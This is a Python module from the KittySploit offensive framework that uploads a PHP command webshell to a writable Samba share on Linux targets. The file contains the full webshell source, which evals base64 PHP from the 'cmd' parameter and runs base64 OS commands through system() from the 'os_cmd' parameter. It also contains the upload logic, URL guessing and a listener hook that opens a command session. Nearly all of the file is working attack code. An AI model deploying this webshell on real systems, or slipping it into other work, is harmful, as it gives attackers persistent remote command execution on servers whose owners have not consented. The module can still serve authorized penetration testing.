#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Deploy a small PHP webshell through a writable Samba share."""

import os
import tempfile
from urllib.parse import quote, urlparse

from kittysploit import *
from core.framework.base_module import ModuleResult
from core.framework.enums import Platform, SessionType
from core.framework.failure import FailureType, ProcedureError
from lib.protocols.smb.smb_session_mixin import SMBSessionMixin


class Module(Post, SMBSessionMixin):
    __info__ = {
        "name": "SMB Linux Deploy PHP Webshell",
        "description": (
            "Uploads a PHP command webshell through a writable Samba share. "
            "Use when the SMB share is also served by a web server."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": SessionType.SMB,
        "references": [],
        "agent": {
            "risk": "intrusive",
            "effects": ["file_write", "webshell_deploy"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["endpoints", "risk_signals"],
            "chain": {
                "consumes_capabilities": ["authenticated_session"],
                "produces_capabilities": ["webshell", "command_execution"],
            },
        },
    }

    share = OptString("public", "Writable Samba share to upload into", True)
    remote_dir = OptString("\\", "Directory inside the share", False)
    remote_name = OptString("ks_shell.php", "Webshell filename", False)
    param_name = OptString("cmd", "HTTP parameter used by KittySploit for base64 PHP code", False)
    system_param_name = OptString(
        "os_cmd",
        "Optional HTTP parameter for base64-encoded OS commands",
        False,
    )
    web_url = OptString("", "Public URL for the uploaded file, if known", False)
    web_port = OptPort(80, "HTTP port for URL hint", False)
    web_ssl = OptBool(False, "Use HTTPS in URL hint", False)
    start_listener = OptBool(False, "Start the matching PHP GET listener after upload", False)
    listener_path = OptString(
        "listeners/web/php_get",
        "Listener module to start when start_listener is true",
        False,
        advanced=True,
    )
    overwrite = OptBool(True, "Overwrite the webshell if it already exists", False)

    def _to_bool(self, value) -> bool:
        if isinstance(value, bool):
            return value
        if isinstance(value, str):
            return value.strip().lower() in {"1", "true", "yes", "y", "on"}
        return bool(value)

    def _remote_path(self) -> tuple[str, str]:
        share = str(self.share or "public").strip().strip("\\")
        remote_dir = str(self.remote_dir or "\\").strip()
        if not remote_dir.startswith("\\"):
            remote_dir = "\\" + remote_dir
        remote_dir = remote_dir.rstrip("\\")
        remote_name = str(self.remote_name or "ks_shell.php").strip().strip("\\/")
        remote_file = f"{remote_dir}\\{remote_name}" if remote_dir else f"\\{remote_name}"
        return share, remote_file

    def _webshell_source(self) -> str:
        param = str(self.param_name or "cmd").strip() or "cmd"
        system_param = str(self.system_param_name or "os_cmd").strip() or "os_cmd"
        return (
            "<?php\n"
            "@error_reporting(0);\n"
            "header('Content-Type: text/plain');\n"
            f"$data = isset($_REQUEST['{param}']) ? $_REQUEST['{param}'] : '';\n"
            "if ($data !== '') {\n"
            "    $decoded = @base64_decode($data);\n"
            "    if ($decoded !== false) {\n"
            "        eval($decoded);\n"
            "    }\n"
            "}\n"
            f"$os_cmd = isset($_REQUEST['{system_param}']) ? $_REQUEST['{system_param}'] : '';\n"
            "if ($os_cmd !== '') {\n"
            "    $decoded_cmd = @base64_decode($os_cmd);\n"
            "    if ($decoded_cmd !== false) {\n"
            "        system($decoded_cmd . ' 2>&1');\n"
            "    }\n"
            "}\n"
            "?>\n"
        )

    def _remote_exists(self, client, share: str, remote_file: str) -> bool:
        parent = remote_file.rsplit("\\", 1)[0] or "\\"
        name = remote_file.rsplit("\\", 1)[-1]
        return any(entry.get("name") == name for entry in client.list_path(share, parent))

    def _url_hint(self, info: dict, remote_file: str) -> str:
        configured = str(self.web_url or "").strip()
        if configured:
            return configured
        host = str(info.get("host") or "").strip()
        if not host:
            return ""
        path = remote_file.strip("\\").replace("\\", "/")
        scheme = "https" if self._to_bool(self.web_ssl) else "http"
        port = int(self.web_port or 80)
        default_port = 443 if scheme == "https" else 80
        port_part = "" if port == default_port else f":{port}"
        return f"{scheme}://{host}{port_part}/{quote(path)}"

    def _listener_target(self, info: dict, url: str) -> tuple[str, int, bool]:
        parsed = urlparse(url) if url else None
        if parsed and parsed.hostname:
            scheme = parsed.scheme or ("https" if self._to_bool(self.web_ssl) else "http")
            port = parsed.port or (443 if scheme == "https" else 80)
            return parsed.hostname, int(port), scheme == "https"
        return (
            str(info.get("host") or "").strip(),
            int(self.web_port or 80),
            self._to_bool(self.web_ssl),
        )

    def _start_listener(self, info: dict, url: str, remote_file: str):
        if not self.framework or not hasattr(self.framework, "load_module"):
            print_warning("Framework unavailable - listener not started")
            return None

        path = str(self.listener_path or "listeners/web/php_get").strip()
        listener = self.framework.load_module(path)
        if not listener:
            print_error(f"Could not load listener: {path}")
            return None

        target, port, ssl_enabled = self._listener_target(info, url)
        uri_path = remote_file.strip("\\").replace("\\", "/")
        if not uri_path.startswith("/"):
            uri_path = "/" + uri_path

        listener.set_option("target", target)
        listener.set_option("port", str(port))
        listener.set_option("ssl", str(bool(ssl_enabled)).lower())
        listener.set_option("uripath", uri_path)
        listener.set_option("param_name", str(self.param_name or "cmd"))

        print_status(f"Starting listener {path} on {target}:{port}{uri_path}")
        if hasattr(listener, "run_with_auto_session"):
            session_id = listener.run_with_auto_session()
        else:
            result = listener.run()
            session_id = (
                listener._create_session_from_connection_data(
                    result[0],
                    result[1],
                    result[2],
                    result[3] if len(result) > 3 else {},
                )
                if isinstance(result, tuple) and len(result) >= 3 and hasattr(listener, "_create_session_from_connection_data")
                else None
            )
        if session_id and isinstance(session_id, str):
            print_success(f"PHP listener session created: {session_id}")
            return session_id
        if session_id:
            print_success("PHP listener started")
            return None
        print_error("PHP listener failed to connect")
        return None

    def check(self):
        sid = str(self.session_id or "").strip()
        if not sid:
            print_error("Session ID is required")
            return False
        if not self.framework or not hasattr(self.framework, "session_manager"):
            print_error("Session manager not available")
            return False
        session = self.framework.session_manager.get_session(sid)
        if not session:
            print_error(f"Session {sid} not found")
            return False
        if str(getattr(session, "session_type", "")).lower() != SessionType.SMB.value:
            print_error("This module requires an SMB session")
            return False
        return True

    def run(self):
        info = self.get_smb_connection_info()
        share, remote_file = self._remote_path()
        client = self.open_smb()

        if self._remote_exists(client, share, remote_file):
            if not self._to_bool(self.overwrite):
                print_error(f"Remote file already exists: {share}:{remote_file}")
                return False
            print_warning(f"Overwriting existing remote file: {share}:{remote_file}")

        with tempfile.NamedTemporaryFile("w", suffix=".php", delete=False, encoding="utf-8") as tmp:
            tmp.write(self._webshell_source())
            local_file = tmp.name

        try:
            print_status(f"Uploading PHP webshell to {share}:{remote_file}")
            if not client.put_file(share, local_file, remote_file):
                raise ProcedureError(FailureType.Unknown, f"Upload failed for {share}:{remote_file}")
        finally:
            try:
                os.unlink(local_file)
            except OSError:
                pass

        print_success(f"PHP webshell uploaded to \\\\{info.get('host', '')}\\{share}{remote_file}")
        url = self._url_hint(info, remote_file)
        if url:
            uri_path = remote_file.strip("\\").replace("\\", "/")
            print_info(f"URL hint: {url}")
            print_info(f"Listener: use listeners/web/php_get with ssl=false and uripath=/{uri_path}")
            print_info(f"Manual test: {url}?{self.system_param_name}=aWQ=")
        else:
            print_info("Set web_url if the share is exposed by HTTP and you know the URL.")

        if self._to_bool(self.start_listener):
            session_id = self._start_listener(info, url, remote_file)
            return ModuleResult(
                success=bool(session_id),
                session_id=session_id,
                data={"url": url, "remote_file": remote_file},
                error=None if session_id else "Listener failed to connect",
            )

        return ModuleResult(success=True, data={"url": url, "remote_file": remote_file})
